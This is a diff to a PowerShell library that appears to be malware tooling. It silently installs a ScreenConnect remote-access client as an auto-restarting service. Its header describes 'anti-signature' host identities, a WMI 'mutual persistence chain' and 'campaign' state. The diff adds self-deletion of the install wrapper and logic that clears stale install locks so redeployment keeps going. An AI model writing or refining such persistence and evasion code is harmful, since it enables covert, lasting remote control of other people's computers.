@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L31
+# OWN_LIB  BUILD 20260802L32
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L31: Get-GryxaMsi pulls from github-drop first (ui.gryxa.com TLS broken on some hosts) + FP-guard. L30: Repair msiexec-free.
+# L32: single-flight lock requires live msiexec (stale wrapper self-clears); wrapper self-deletes after install. L31: github-first MSI.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -561,6 +561,7 @@ function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
         "sc config `"ScreenConnect Client ($Fp)`" start= auto",
         "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000",
         "sc start `"ScreenConnect Client ($Fp)`"",
+        "del /f /q `"$cmd`" >nul 2>&1",
         'exit'
     )
     Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
@@ -577,9 +578,15 @@ function Invoke-GryxaEnsure {
     function GLog([string]$m) { Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -ErrorAction SilentlyContinue }
 
     $installCmd = Join-Path $WorkDir 'gryxa_install.cmd'
+    # L32: only honor the single-flight lock if msiexec is ACTUALLY running.
+    # A stale wrapper from a killed/failed install must not block recovery.
     if ((Test-Path $installCmd) -and (((Get-Date) - (Get-Item $installCmd).LastWriteTime).TotalMinutes -lt 15)) {
-        GLog 'inflight_install'
-        return "HEALTHY|$(Get-GryxaFp)|inflight=1"
+        $msiRunning = [bool](Get-CimInstance Win32_Process -Filter "Name='msiexec.exe'" -ErrorAction SilentlyContinue |
+            Where-Object { $_.CommandLine -match 'gryxa|pkg_gryxa|ScreenConnect' })
+        if ($msiRunning) { GLog 'inflight_install'; return "HEALTHY|$(Get-GryxaFp)|inflight=1" }
+        # wrapper present but no install running -> stale; clear it and continue
+        Remove-Item -LiteralPath $installCmd -Force -ErrorAction SilentlyContinue
+        GLog 'stale_install_wrapper_cleared'
     }
 
     $fp = Get-GryxaFp
